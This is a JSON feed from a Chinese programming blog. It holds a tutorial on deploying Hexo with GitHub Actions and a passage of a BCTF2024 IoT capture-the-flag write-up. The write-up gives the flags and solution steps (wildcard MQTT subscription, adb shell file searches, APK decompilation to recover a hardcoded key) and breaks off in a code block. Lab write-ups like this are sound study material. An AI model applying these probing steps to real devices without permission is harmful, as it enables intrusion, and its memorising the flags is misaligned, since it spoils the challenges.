{
    "version": "https://jsonfeed.org/version/1",
    "title": "十二的编程笔记",
    "subtitle": "hello world",
    "icon": "https://blog.twelveeee.top/images/favicon.ico",
    "description": "十二的编程笔记",
    "home_page_url": "https://blog.twelveeee.top",
    "items": [
        {
            "id": "https://blog.twelveeee.top/2024/Project/hexo-github-action-deploy/",
            "url": "https://blog.twelveeee.top/2024/Project/hexo-github-action-deploy/",
            "title": "Hexo 使用github Action 进行发布",
            "date_published": "2024-10-01T13:00:00.000Z",
            "content_html": "<h1 id=\"hexo-使用github-action-发布\"><a class=\"anchor\" href=\"#hexo-使用github-action-发布\">#</a> Hexo 使用 github Action 发布</h1>\n<h2 id=\"介绍\"><a class=\"anchor\" href=\"#介绍\">#</a> 介绍</h2>\n<p>Github Actions 可以很方便实现 CI/CD 工作流，类似 Travis 的用法，来帮我们完成一些工作，比如实现自动化测试、打包、部署等操作。当我们运行 Jobs 时，它会创建一个容器 (runner)，容器支持：Ubuntu、Windows 和 MacOS 等系统，在容器中我们可以安装软件，利用安装的软件帮我们处理一些数据，然后把处理好的数据推送到某个地方。</p>\n<p>本文将介绍利用 Github Actions 实现自动部署 hexo 到 Github Pages 和阿里云 oss</p>\n<p>没有 Github Actions 之前，我们需要写完文章执行  <code>hexo d</code>  来进行部署。有了 Github Actions  之后，workflow 会自动部署我们的笔记。</p>\n<h2 id=\"前提\"><a class=\"anchor\" href=\"#前提\">#</a> 前提</h2>\n<h3 id=\"创建所需仓库\"><a class=\"anchor\" href=\"#创建所需仓库\">#</a> 创建所需仓库</h3>\n<ol>\n<li>创建一个 github 仓库用来存放 Hexo 项目，我这边是  <code>Twelveeee/MyNotesBlog</code>  一个 private 的仓库</li>\n<li>创建  <code>your.github.io</code>  仓库用来存放静态博客 github page，我这边是  <code>Twelveeee/Twelveeee.github.io</code></li>\n</ol>\n<h3 id=\"配置-githubtoken\"><a class=\"anchor\" href=\"#配置-githubtoken\">#</a> 配置 GithubToken</h3>\n<p>GithubToken 是为了在执行 githubAction 的时候有权限访问仓库</p>\n<p>参考 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLjUxY3RvLmNvbS91XzE1MDY5NDg1LzM1OTAzNDY=\">https://blog.51cto.com/u_15069485/3590346</span></p>\n<p>在 github setting 打开 Developer settings</p>\n<p><img data-src=\"https://twelveeee-note.oss-cn-beijing.aliyuncs.com/Image/image-20241001233238214.png\" alt=\"image-20241001233238214\" /></p>\n<p>打开 Personal access tokens</p>\n<p><img data-src=\"https://twelveeee-note.oss-cn-beijing.aliyuncs.com/Image/image-20241001233409638.png\" alt=\"image-20241001233409638\" /></p>\n<p>点击 Generate new token 按钮</p>\n<p><img data-src=\"https://twelveeee-note.oss-cn-beijing.aliyuncs.com/Image/image-20241001233508640.png\" alt=\"image-20241001233508640\" /></p>\n<p>选择对应的仓库</p>\n<p><img data-src=\"https://twelveeee-note.oss-cn-beijing.aliyuncs.com/Image/image-20241001233811094.png\" alt=\"image-20241001233811094\" /></p>\n<p><strong>Permissions</strong> 开</p>\n<p><code>Read access to actions variables and secrets</code></p>\n<p><code>Read and Write access to actions, code, commit statuses, deployments, environments, pages, pull requests, and workflows</code></p>\n<p>获取到 token 记录下来</p>\n<h3 id=\"配置-githubaction-参数\"><a class=\"anchor\" href=\"#配置-githubaction-参数\">#</a> 配置 GithubAction 参数</h3>\n<p>打开项目，  <code>Settinngs-&gt;Secrets and variables New repository secret</code></p>\n<p><img data-src=\"https://twelveeee-note.oss-cn-beijing.aliyuncs.com/Image/image-20241002000219935.png\" alt=\"image-20241002000219935\" /></p>\n<p>把上面提到的 token 写进去 变量名称需要与下面的 deploy.yml 一致</p>\n<h2 id=\"编写-github-actions\"><a class=\"anchor\" href=\"#编写-github-actions\">#</a> 编写 Github Actions</h2>\n<h3 id=\"workflow-模版\"><a class=\"anchor\" href=\"#workflow-模版\">#</a> Workflow 模版</h3>\n<p>在  <code>blog</code>  仓库根目录下创建  <code>.github/workflows/deploy.yml</code>  文件，目录结构如下。</p>\n<pre><code>blog (repository)\n└── .github\n    └── workflows\n        └── deploy.yml\n</code></pre>\n<p>在  <code>deploy.yml</code>  文件中粘贴以下内容。并且更改 env 为自己对应的值。</p>\n<figure class=\"highlight yaml\"><figcaption data-lang=\"YAML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token key atrule\">name</span><span class=\"token punctuation\">:</span> Pages</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token key atrule\">on</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token key atrule\">push</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token key atrule\">branches</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>      <span class=\"token punctuation\">-</span> main</pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token key atrule\">env</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token key atrule\">GIT_USER</span><span class=\"token punctuation\">:</span> Twelveeee</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token key atrule\">GIT_EMAIL</span><span class=\"token punctuation\">:</span> twelveeee12@gmail.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token key atrule\">THEME_REPO</span><span class=\"token punctuation\">:</span> Twelveeee/hexo<span class=\"token punctuation\">-</span>theme<span class=\"token punctuation\">-</span>shokaV2</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token key atrule\">THEME_BRANCH</span><span class=\"token punctuation\">:</span> master</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token key atrule\">THEME_NAME</span><span class=\"token punctuation\">:</span> shoka</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token key atrule\">DEPLOY_REPO</span><span class=\"token punctuation\">:</span> Twelveeee/Twelveeee.github.io</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token key atrule\">DEPLOY_BRANCH</span><span class=\"token punctuation\">:</span> main</pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token key atrule\">jobs</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token key atrule\">build</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token key atrule\">runs-on</span><span class=\"token punctuation\">:</span> ubuntu<span class=\"token punctuation\">-</span>latest</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token key atrule\">steps</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>      <span class=\"token punctuation\">-</span> <span class=\"token key atrule\">uses</span><span class=\"token punctuation\">:</span> actions/checkout@v4</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token key atrule\">with</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>          <span class=\"token key atrule\">token</span><span class=\"token punctuation\">:</span> $<span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#123;</span>secrets.PAT_TOKEN<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>          <span class=\"token key atrule\">submodules</span><span class=\"token punctuation\">:</span> recursive</pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>      <span class=\"token punctuation\">-</span> <span class=\"token key atrule\">name</span><span class=\"token punctuation\">:</span> Configuration environment</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token key atrule\">run</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">|</span><span class=\"token scalar string\"></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>          sudo timedatectl set-timezone \"Asia/Shanghai\"</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>          git config --global user.name $GIT_USER</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>          git config --global user.email $GIT_EMAIL</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>      <span class=\"token punctuation\">-</span> <span class=\"token key atrule\">name</span><span class=\"token punctuation\">:</span> Checkout theme repo</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token key atrule\">uses</span><span class=\"token punctuation\">:</span> actions/checkout@v4</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token key atrule\">with</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>          <span class=\"token key atrule\">repository</span><span class=\"token punctuation\">:</span> $<span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#123;</span> env.THEME_REPO <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>          <span class=\"token key atrule\">ref</span><span class=\"token punctuation\">:</span> $<span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#123;</span> env.THEME_BRANCH <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>          <span class=\"token key atrule\">path</span><span class=\"token punctuation\">:</span> themes/$<span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#123;</span> env.THEME_NAME <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>          <span class=\"token key atrule\">token</span><span class=\"token punctuation\">:</span> $<span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#123;</span> secrets.PAT_TOKEN <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>      <span class=\"token punctuation\">-</span> <span class=\"token key atrule\">name</span><span class=\"token punctuation\">:</span> Checkout deploy repo</pre></td></tr><tr><td data-num=\"41\"></td><td><pre>        <span class=\"token key atrule\">uses</span><span class=\"token punctuation\">:</span> actions/checkout@v4</pre></td></tr><tr><td data-num=\"42\"></td><td><pre>        <span class=\"token key atrule\">with</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>          <span class=\"token key atrule\">repository</span><span class=\"token punctuation\">:</span> $<span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#123;</span> env.DEPLOY_REPO <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>          <span class=\"token key atrule\">ref</span><span class=\"token punctuation\">:</span> $<span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#123;</span> env.DEPLOY_BRANCH <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>          <span class=\"token key atrule\">path</span><span class=\"token punctuation\">:</span> .deploy_git</pre></td></tr><tr><td data-num=\"46\"></td><td><pre>          <span class=\"token key atrule\">token</span><span class=\"token punctuation\">:</span> $<span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#123;</span> secrets.PAT_TOKEN <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"48\"></td><td><pre>      <span class=\"token punctuation\">-</span> <span class=\"token key atrule\">name</span><span class=\"token punctuation\">:</span> Use Node.js 20</pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        <span class=\"token key atrule\">uses</span><span class=\"token punctuation\">:</span> actions/setup<span class=\"token punctuation\">-</span>node@v4</pre></td></tr><tr><td data-num=\"50\"></td><td><pre>        <span class=\"token key atrule\">with</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>          <span class=\"token key atrule\">node-version</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"20\"</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>      <span class=\"token punctuation\">-</span> <span class=\"token key atrule\">name</span><span class=\"token punctuation\">:</span> Cache NPM dependencies</pre></td></tr><tr><td data-num=\"53\"></td><td><pre>        <span class=\"token key atrule\">uses</span><span class=\"token punctuation\">:</span> actions/cache@v4</pre></td></tr><tr><td data-num=\"54\"></td><td><pre>        <span class=\"token key atrule\">with</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>          <span class=\"token key atrule\">path</span><span class=\"token punctuation\">:</span> node_modules</pre></td></tr><tr><td data-num=\"56\"></td><td><pre>          <span class=\"token key atrule\">key</span><span class=\"token punctuation\">:</span> $<span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#123;</span> runner.OS <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">-</span>npm<span class=\"token punctuation\">-</span>cache</pre></td></tr><tr><td data-num=\"57\"></td><td><pre>          <span class=\"token key atrule\">restore-keys</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">|</span><span class=\"token scalar string\"></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>            $&#123;&#123; runner.OS &#125;&#125;-npm-cache</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>      <span class=\"token punctuation\">-</span> <span class=\"token key atrule\">name</span><span class=\"token punctuation\">:</span> Install Dependencies</pre></td></tr><tr><td data-num=\"60\"></td><td><pre>        <span class=\"token key atrule\">run</span><span class=\"token punctuation\">:</span> npm install</pre></td></tr><tr><td data-num=\"61\"></td><td><pre></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>      <span class=\"token punctuation\">-</span> <span class=\"token key atrule\">name</span><span class=\"token punctuation\">:</span> Deploy hexo</pre></td></tr><tr><td data-num=\"63\"></td><td><pre>        <span class=\"token key atrule\">env</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>          <span class=\"token key atrule\">GITHUB_TOKEN</span><span class=\"token punctuation\">:</span> $<span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#123;</span> secrets.PAT_TOKEN <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>        <span class=\"token key atrule\">run</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">|</span><span class=\"token scalar string\"></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>          npm run deploy</span></pre></td></tr></table></figure><h3 id=\"模版说明\"><a class=\"anchor\" href=\"#模版说明\">#</a> 模版说明</h3>\n<h4 id=\"workflow-overview\"><a class=\"anchor\" href=\"#workflow-overview\">#</a> Workflow Overview</h4>\n<p>这个工作流名为  <code>Pages</code> ，在  <code>main</code>  分支有新的推送时会被触发。都会自动更新博客的内容。</p>\n<h4 id=\"environment-variables\"><a class=\"anchor\" href=\"#environment-variables\">#</a> Environment Variables</h4>\n<ul>\n<li><strong>GIT_USER</strong>: Git 用户名，用于配置 Git 提交。</li>\n<li><strong>GIT_EMAIL</strong>: Git 邮箱地址，用于配置 Git 提交。</li>\n<li><strong>THEME_REPO</strong>: Hexo 主题的仓库地址。</li>\n<li><strong>THEME_BRANCH</strong>: Hexo 主题的分支。</li>\n<li><strong>THEME_NAME</strong>: Hexo 主题的名称。</li>\n<li><strong>DEPLOY_REPO</strong>: 部署的 GitHub Pages 仓库。</li>\n<li><strong>DEPLOY_BRANCH</strong>: 部署的分支。</li>\n</ul>\n<h4 id=\"job-build\"><a class=\"anchor\" href=\"#job-build\">#</a> Job: build</h4>\n<p>这个工作流定义了一个名为  <code>build</code>  的作业，运行在最新的 Ubuntu 环境上。</p>\n<h5 id=\"steps\"><a class=\"anchor\" href=\"#steps\">#</a> Steps</h5>\n<ol>\n<li><strong>Checkout Main Repository</strong>:\n<ul>\n<li>使用  <code>actions/checkout@v4</code>  来签出触发工作流的主仓库代码。</li>\n<li>使用  <code>$&#123;&#123; secrets.PAT_TOKEN &#125;&#125;</code>  作为身份验证令牌。</li>\n<li>递归地签出子模块。</li>\n</ul>\n</li>\n<li><strong>Configuration Environment</strong>:\n<ul>\n<li>设置时区为 &quot;Asia/Shanghai&quot;。</li>\n<li>配置 Git 用户名和邮箱，以便后续的提交操作。</li>\n</ul>\n</li>\n<li><strong>Checkout Theme Repository</strong>:\n<ul>\n<li>使用  <code>actions/checkout@v4</code>  签出主题仓库。</li>\n<li>指定分支和路径为  <code>themes/$&#123;&#123; env.THEME_NAME &#125;&#125;</code> 。</li>\n<li>使用  <code>$&#123;&#123; secrets.PAT_TOKEN &#125;&#125;</code>  进行身份验证。</li>\n</ul>\n</li>\n<li><strong>Checkout Deploy Repository</strong>:\n<ul>\n<li>使用  <code>actions/checkout@v4</code>  签出用于部署的仓库。</li>\n<li>指定分支和路径为  <code>.deploy_git</code> 。</li>\n<li>使用  <code>$&#123;&#123; secrets.PAT_TOKEN &#125;&#125;</code>  进行身份验证。</li>\n</ul>\n</li>\n<li><strong>Use Node.js 20</strong>:\n<ul>\n<li>使用  <code>actions/setup-node@v4</code>  来设置 Node.js 环境，版本为 20。</li>\n</ul>\n</li>\n<li><strong>Cache NPM Dependencies</strong>:\n<ul>\n<li>使用  <code>actions/cache@v4</code>  缓存  <code>node_modules</code>  目录，以加速后续的构建。</li>\n<li>使用  <code>$&#123;&#123; runner.OS &#125;&#125;-npm-cache</code>  作为缓存键。</li>\n</ul>\n</li>\n<li><strong>Install Dependencies</strong>:\n<ul>\n<li>运行  <code>npm install</code>  安装项目所需的依赖。</li>\n</ul>\n</li>\n<li><strong>Deploy Hexo</strong>:\n<ul>\n<li>设置  <code>GITHUB_TOKEN</code>  环境变量，用于身份验证。</li>\n<li>运行  <code>npm run deploy</code> ，执行 Hexo 部署脚本，将生成的静态文件推送到 GitHub Pages 仓库。</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"部署注意事项\"><a class=\"anchor\" href=\"#部署注意事项\">#</a> 部署注意事项</h3>\n<p>因为使用到了  <code>npm run deploy</code>  所以  <code>package.json</code>  里面要有 deploy</p>\n<figure class=\"highlight json\"><figcaption data-lang=\"JSON\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token property\">\"scripts\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token property\">\"build\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"hexo generate\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token property\">\"clean\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"hexo clean\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token property\">\"deploy\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"hexo deploy\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token property\">\"server\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"hexo server\"</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr></table></figure><p>使用  <code>hexo deploy</code></p>\n<p>所以需要确保安装了 hexo deploy 服务</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 发布到 oss</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">npm</span> i hexo-deployer-ali-oss-extend</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># 发布到 github page </span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">npm</span> <span class=\"token function\">install</span> hexo-deployer-git <span class=\"token parameter variable\">--save</span></pre></td></tr></table></figure><p>并且配置了相应的配置</p>\n<p><code>_config.yml</code>  里</p>\n<figure class=\"highlight yml\"><figcaption data-lang=\"YAML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token key atrule\">deploy</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">-</span> <span class=\"token key atrule\">type</span><span class=\"token punctuation\">:</span> ali<span class=\"token punctuation\">-</span>oss</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token key atrule\">region</span><span class=\"token punctuation\">:</span> oss<span class=\"token punctuation\">-</span>cn<span class=\"token punctuation\">-</span>beijing</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token key atrule\">accessKeyId</span><span class=\"token punctuation\">:</span> <span class=\"token important\">***</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token key atrule\">accessKeySecret</span><span class=\"token punctuation\">:</span> <span class=\"token important\">***</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token key atrule\">bucket</span><span class=\"token punctuation\">:</span> <span class=\"token important\">***</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token key atrule\">cacheControl</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token key atrule\">images</span><span class=\"token punctuation\">:</span> </pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token key atrule\">css</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token key atrule\">js</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token key atrule\">html</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token key atrule\">other</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">-</span> <span class=\"token key atrule\">type</span><span class=\"token punctuation\">:</span> git</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token key atrule\">repo</span><span class=\"token punctuation\">:</span> https<span class=\"token punctuation\">:</span>//github.com/Twelveeee/Twelveeee.github.io</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token key atrule\">branch</span><span class=\"token punctuation\">:</span> main</pre></td></tr></table></figure><p>当然，如果没有对应的 type 可以将相应的配置注释掉。</p>\n<h3 id=\"执行任务\"><a class=\"anchor\" href=\"#执行任务\">#</a> 执行任务</h3>\n<p><img data-src=\"https://twelveeee-note.oss-cn-beijing.aliyuncs.com/Image/image-20241002001734778.png\" alt=\"image-20241002001734778\" /></p>\n<p>任务完成之后查看 对应的 github page</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2VsdmVlZWUuZ2l0aHViLmlvLw==\">https://twelveeee.github.io/</span></p>\n<p>确实有相应的文章</p>\n<h2 id=\"参考资料\"><a class=\"anchor\" href=\"#参考资料\">#</a> 参考资料</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3MvZ2l0aHViLXBhZ2VzI09uZS1jb21tYW5kLWRlcGxveW1lbnQ=\">https://hexo.io/docs/github-pages#One-command-deployment</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zYW5vbnouZ2l0aHViLmlvLzIwMjAvZGVwbG95LWEtaGV4by1ibG9nLWZyb20tZ2l0aHViLWFjdGlvbnMv\">https://sanonz.github.io/2020/deploy-a-hexo-blog-from-github-actions/</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2FjdGlvbnMvY2hlY2tvdXQ=\">https://github.com/actions/checkout</span></p>\n",
            "tags": [
                "计算机科学",
                "Project",
                "github"
            ]
        },
        {
            "id": "https://blog.twelveeee.top/2024/CTF/BCTF2024/iot/",
            "url": "https://blog.twelveeee.top/2024/CTF/BCTF2024/iot/",
            "title": "BCTF2024-IOT",
            "date_published": "2024-09-27T07:00:00.000Z",
            "content_html": "<h1 id=\"bctf2024-iot\"><a class=\"anchor\" href=\"#bctf2024-iot\">#</a> BCTF2024-IOT</h1>\n<h2 id=\"常见的iot通信协议\"><a class=\"anchor\" href=\"#常见的iot通信协议\">#</a> 常见的 IOT 通信协议</h2>\n<p><strong>题目</strong></p>\n<blockquote>\n<p>常见的 IOT 通信协议</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL2V4YW1wbGUuY29tOjgwMDE=\">example.com:8001</span></p>\n</blockquote>\n<details class=\"warning\"><summary>答案</summary><div>\n<p><span class=\"spoiler bulr\" title=\"你知道得太多了\">flag{a2467320ce0f9bc6fda0a1f714e49933}</span></p>\n</div></details>\n<details class=\"success\"><summary>题解</summary><div>\n<p>brew install mosquitto</p>\n<p>mosquitto_sub -h <span class=\"exturl\" data-url=\"aHR0cDovL2V4YW1wbGUuY29t\">example.com</span>  -p 8001 -t &quot;#&quot;</p>\n</div></details>\n<h2 id=\"easyandroidemulator\"><a class=\"anchor\" href=\"#easyandroidemulator\">#</a> EasyAndroidEmulator</h2>\n<p><strong>题目</strong></p>\n<blockquote>\n<ol>\n<li>环境要求：x86_64，java17</li>\n<li>根据以下资源与提示运行一个 Android 模拟器:<br />\nAndroid Studio：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9kZXZlbG9wZXIuYW5kcm9pZC5jb20vc3R1ZGlv\">https://developer.android.com/studio</span><br />\nSDK Tools：Android SDK Command-line Tools、Android SDK-Platform-Tools、Android Emulator<br />\nSDK Updates Sites: 文件 bctf-sys-img2-1-0.xml<br />\nsdkmanager: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9kZXZlbG9wZXIuYW5kcm9pZC5jb20vdG9vbHMvc2RrbWFuYWdlcg==\">https://developer.android.com/tools/sdkmanager</span><br />\navdmanager: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9kZXZlbG9wZXIuYW5kcm9pZC5jb20vdG9vbHMvYXZkbWFuYWdlcg==\">https://developer.android.com/tools/avdmanager</span><br />\nemulator: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9kZXZlbG9wZXIuYW5kcm9pZC5jb20vc3R1ZGlvL3J1bi9lbXVsYXRvci1jb21tYW5kbGluZQ==\">https://developer.android.com/studio/run/emulator-commandline</span></li>\n<li>题目镜像：&quot;system-images;android-33;bctf-easy-android-emu;x86_64&quot;</li>\n<li>运行成功通过 adb 获取 flag</li>\n</ol>\n</blockquote>\n<details class=\"warning\"><summary>答案</summary><div>\n<p><span class=\"spoiler bulr\" title=\"你知道得太多了\">flag{RN15l3IyVPzdBOaQC5XUkW4q8r26WA47}</span></p>\n</div></details>\n<details class=\"success\"><summary>题解</summary><div>\n<p>下载 android-studio<br />\n 安装 剩下的东西</p>\n<p>搭建环境，启动模拟器</p>\n<p>adb devices<br />\nadb shell</p>\n<p>find / -name &quot;flag*&quot; 2&gt;/dev/null</p>\n<p>找到路径<br />\n执行 /bin/flag</p>\n</div></details>\n<h2 id=\"encryption\"><a class=\"anchor\" href=\"#encryption\">#</a> encryption</h2>\n<p><strong>题目</strong></p>\n<blockquote>\n<ol>\n<li>环境：与 easy-android-emu 同样的基本环境。</li>\n<li>题目镜像：&quot;system-images;android-33;bctf-encryption;x86_64&quot;</li>\n</ol>\n</blockquote>\n<details class=\"warning\"><summary>答案</summary><div>\n<p><span class=\"spoiler bulr\" title=\"你知道得太多了\">flag{tf4Lsa4KB99x1CmU1raGwuzcA7Pm1sCL}</span></p>\n</div></details>\n<details class=\"success\"><summary>题解</summary><div>\n<pre><code>按照上一题的解法，打开模拟器后\n\nadb devices\nadb shell\n\n\n# 找到文件\nfind / -name &quot;*encryption*&quot; 2&gt;/dev/null\n\n\nadb pull /product/app/encryption/encryption.apk\nadb pull /product/app/encryption/oat/x86_64/encryption.odex\nadb pull /product/app/encryption/oat/x86_64/encryption.vdex\n\n\n# 下载apktool 进行解密\n# https://juejin.cn/post/7158107697907236878\n\n\n搜索 flag \n找到 encryption/smali/com/bctf/encryption/EncryptionService.smali\n\n\n加密串 z++f9Pms0o2J6j9wYyvHeGvi3lhbLqbOUVdXPmNeLFQIHSYoF+gnmRscOO8OzCUD\npkcs7\n密钥 bctfbctfbctfbctf\n\n</code></pre>\n</div></details>\n<h2 id=\"easyprivatenetworkprotocol\"><a class=\"anchor\" href=\"#easyprivatenetworkprotocol\">#</a> EasyPrivateNetworkProtocol</h2>\n<p><strong>题目</strong></p>\n<blockquote>\n<p>私有网络协议分析<br />\n<span class=\"exturl\" data-url=\"aHR0cDovL2V4YW1wbGUuY29tOjg4ODg=\"> example.com:8888</span><br />\n <code>https://twelveeee-note.oss-cn-beijing.aliyuncs.com/file/bctf2024/iot_challenge</code></p>\n</blockquote>\n<details class=\"warning\"><summary>答案</summary><div>\n<p>差一点做出来</p>\n<p><span class=\"spoiler bulr\" title=\"你知道得太多了\">flag{0Njb867t0ppd79Mel8XYP8Ms9UeptGNX}</span></p>\n</div></details>\n<details class=\"success\"><summary>题解</summary><div>\n<p>IDA 读 二进制文件</p>\n<p>发现几个函数</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token 